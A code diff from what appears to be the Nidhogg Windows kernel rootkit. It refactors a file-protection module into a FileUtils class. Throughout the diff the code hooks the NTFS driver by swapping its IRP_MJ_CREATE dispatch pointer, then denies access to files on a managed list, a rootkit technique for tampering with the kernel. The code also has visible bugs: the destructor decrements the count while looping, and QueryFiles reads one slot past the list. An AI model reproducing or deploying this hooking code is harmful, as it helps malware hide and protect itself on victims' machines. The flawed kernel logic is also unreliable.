@@ -1,6 +1,29 @@
 #include "pch.h"
 #include "FileUtils.hpp"
 
+FileUtils::FileUtils() {
+	this->Files.FilesCount = 0;
+
+	for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
+		this->Callbacks[i].Activated = false;
+
+	this->Lock.Init();
+}
+
+FileUtils::~FileUtils() {
+	AutoLock locker(this->Lock);
+
+	for (ULONG i = 0; i < this->Files.FilesCount; i++) {
+		ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
+		this->Files.FilesPath[i] = nullptr;
+		this->Files.FilesCount--;
+	}
+
+	// Uninstalling NTFS hooks if there are any.
+	if (this->Callbacks[0].Activated)
+		UninstallNtfsHook(IRP_MJ_CREATE);
+}
+
 /*
 * Description:
 * HookedNtfsIrpCreate is responsible for handling the NTFS IRP_MJ_CREATE.
@@ -17,21 +40,21 @@ NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
 	if (!stack || !stack->FileObject)
-		return ((tNtfsIrpFunction)fGlobals.Callbacks[0].Address)(DeviceObject, Irp);
+		return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
 
 	if (stack->FileObject->FileName.Length == 0)
-		return ((tNtfsIrpFunction)fGlobals.Callbacks[0].Address)(DeviceObject, Irp);
+		return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
 
 	wcscat(fullPath, stack->FileObject->FileName.Buffer);
 
-	AutoLock locker(fGlobals.Lock);
+	AutoLock locker(NidhoggFileUtils->GetFileLock());
 
-	if (FindFile(fullPath)) {
+	if (NidhoggFileUtils->FindFile(fullPath)) {
 		Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
 		return STATUS_SUCCESS;
 	}
 
-	return ((tNtfsIrpFunction)fGlobals.Callbacks[0].Address)(DeviceObject, Irp);
+	return ((tNtfsIrpFunction)NidhoggFileUtils->GetNtfsCallback(0).Address)(DeviceObject, Irp);
 }
 
 /*
@@ -44,7 +67,7 @@ NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 * Returns:
 * @status		 [NTSTATUS] -- Whether hooked or not.
 */
-NTSTATUS InstallNtfsHook(int irpMjFunction) {
+NTSTATUS FileUtils::InstallNtfsHook(int irpMjFunction) {
 	UNICODE_STRING ntfsName;
 	PDRIVER_OBJECT ntfsDriverObject = nullptr;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -59,8 +82,8 @@ NTSTATUS InstallNtfsHook(int irpMjFunction) {
 
 	switch (irpMjFunction) {
 		case IRP_MJ_CREATE: {
-			fGlobals.Callbacks[0].Address = (PVOID)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)HookedNtfsIrpCreate);
-			fGlobals.Callbacks[0].Activated = true;
+			this->Callbacks[0].Address = (PVOID)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)HookedNtfsIrpCreate);
+			this->Callbacks[0].Activated = true;
 			KdPrint((DRIVER_PREFIX "Switched addresses\n"));
 			break;
 		}
@@ -82,7 +105,7 @@ NTSTATUS InstallNtfsHook(int irpMjFunction) {
 * Returns:
 * @status		 [NTSTATUS] -- Whether removed or not.
 */
-NTSTATUS UninstallNtfsHook(int irpMjFunction) {
+NTSTATUS FileUtils::UninstallNtfsHook(int irpMjFunction) {
 	UNICODE_STRING ntfsName;
 	PDRIVER_OBJECT ntfsDriverObject = NULL;
 	NTSTATUS status = STATUS_SUCCESS;
@@ -96,9 +119,9 @@ NTSTATUS UninstallNtfsHook(int irpMjFunction) {
 
 	switch (irpMjFunction) {
 	case IRP_MJ_CREATE: {
-		InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[irpMjFunction], (LONG64)fGlobals.Callbacks[0].Address);
-		fGlobals.Callbacks[0].Address = nullptr;
-		fGlobals.Callbacks[0].Activated = false;
+		InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[irpMjFunction], (LONG64)this->Callbacks[0].Address);
+		this->Callbacks[0].Address = nullptr;
+		this->Callbacks[0].Activated = false;
 		break;
 	}
 	default:
@@ -121,9 +144,9 @@ NTSTATUS UninstallNtfsHook(int irpMjFunction) {
 * Returns:
 * @status [bool]   -- Whether found or not.
 */
-bool FindFile(WCHAR* path) {
-	for (int i = 0; i < fGlobals.Files.FilesCount; i++)
-		if (_wcsicmp(fGlobals.Files.FilesPath[i], path) == 0)
+bool FileUtils::FindFile(WCHAR* path) {
+	for (ULONG i = 0; i < this->Files.FilesCount; i++)
+		if (_wcsicmp(this->Files.FilesPath[i], path) == 0)
 			return true;
 	return false;
 }
@@ -138,9 +161,9 @@ bool FindFile(WCHAR* path) {
 * Returns:
 * @status [bool]   -- Whether successfully added or not.
 */
-bool AddFile(WCHAR* path) {
+bool FileUtils::AddFile(WCHAR* path) {
 	for (int i = 0; i < MAX_FILES; i++)
-		if (fGlobals.Files.FilesPath[i] == nullptr) {
+		if (this->Files.FilesPath[i] == nullptr) {
 			auto len = (wcslen(path) + 1) * sizeof(WCHAR);
 			auto buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);
 
@@ -150,8 +173,8 @@ bool AddFile(WCHAR* path) {
 			}
 
 			wcscpy_s(buffer, len / sizeof(WCHAR), path);
-			fGlobals.Files.FilesPath[i] = buffer;
-			fGlobals.Files.FilesCount++;
+			this->Files.FilesPath[i] = buffer;
+			this->Files.FilesCount++;
 			return true;
 		}
 	return false;
@@ -167,13 +190,56 @@ bool AddFile(WCHAR* path) {
 * Returns:
 * @status [bool]   -- Whether successfully removed or not.
 */
-bool RemoveFile(WCHAR* path) {
-	for (int i = 0; i < fGlobals.Files.FilesCount; i++)
-		if (_wcsicmp(fGlobals.Files.FilesPath[i], path) == 0) {
-			ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
-			fGlobals.Files.FilesPath[i] = nullptr;
-			fGlobals.Files.FilesCount--;
+bool FileUtils::RemoveFile(WCHAR* path) {
+	for (ULONG i = 0; i < this->Files.FilesCount; i++)
+		if (_wcsicmp(this->Files.FilesPath[i], path) == 0) {
+			ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
+			this->Files.FilesPath[i] = nullptr;
+			this->Files.FilesCount--;
 			return true;
 		}
 	return false;
+}
+
+void FileUtils::ClearFilesList() {
+	AutoLock locker(this->GetFileLock());
+
+	for (ULONG i = 0; i < this->Files.FilesCount; i++) {
+		ExFreePoolWithTag(this->Files.FilesPath[i], DRIVER_TAG);
+		this->Files.FilesPath[i] = nullptr;
+	}
+
+	this->Files.FilesCount = 0;
+}
+
+NTSTATUS FileUtils::QueryFiles(FileItem* item) {
+	NTSTATUS status = STATUS_SUCCESS;
+	errno_t err = 0;
+	AutoLock locker(this->Lock);
+
+	if (item->FileIndex == 0) {
+		item->FileIndex = this->Files.FilesCount;
+
+		if (this->Files.FilesCount > 0) {
+			err = wcscpy_s(item->FilePath, this->Files.FilesPath[0]);
+
+			if (err != 0) {
+				status = STATUS_INVALID_USER_BUFFER;
+				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+			}
+		}
+	}
+	else if (item->FileIndex > this->Files.FilesCount) {
+		status = STATUS_INVALID_PARAMETER;
+	}
+	else {
+		err = wcscpy_s(item->FilePath, this->Files.FilesPath[item->FileIndex]);
+
+		if (err != 0) {
+			status = STATUS_INVALID_USER_BUFFER;
+			KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
+		}
+	}
+
+	return status;
 }
